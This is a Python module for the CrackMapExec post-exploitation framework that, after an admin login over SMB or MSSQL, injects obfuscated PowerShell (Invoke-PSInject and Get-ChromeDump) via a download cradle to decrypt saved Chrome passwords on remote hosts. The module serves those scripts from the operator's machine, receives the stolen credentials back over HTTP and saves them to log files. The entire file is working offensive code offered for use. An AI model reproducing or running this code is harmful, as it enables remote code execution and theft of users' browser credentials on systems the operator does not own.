from cme.helpers.powershell import *
from cme.helpers.logger import write_log
from datetime import datetime
from io import StringIO

class CMEModule:
    '''
        Executes Get-ChromeDump to decrypt saved chrome credentials
        Module by @byt3bl33d3r
    '''

    name = 'enum_chrome'
    description = "Decrypts saved Chrome passwords using Get-ChromeDump"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = False
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        '''

        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1')
        self.ps_script2 = obfs_ps_script('randomps-scripts/Get-ChromeDump.ps1')

    def on_admin_login(self, context, connection):

        command = 'Get-ChromeDump | Out-String'
        chrome_cmd = gen_ps_iex_cradle(context, 'Get-ChromeDump.ps1', command)

        launcher = gen_ps_inject(chrome_cmd, context)

        connection.ps_execute(launcher)
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-PSInject.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script1)

        elif 'Get-ChromeDump.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script2)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.get('content-length'))
        data = response.rfile.read(length).decode()

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data):
            buf = StringIO(data).readlines()
            for line in buf:
                context.log.highlight(line)

            log_name = 'ChromeDump-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            write_log(data, log_name)
            context.log.info("Saved raw Get-ChromeDump output to {}".format(log_name))

    #def on_shutdown(self, context):
        #context.info('Removing SQLite assembly file')
        #connection.ps_execute('')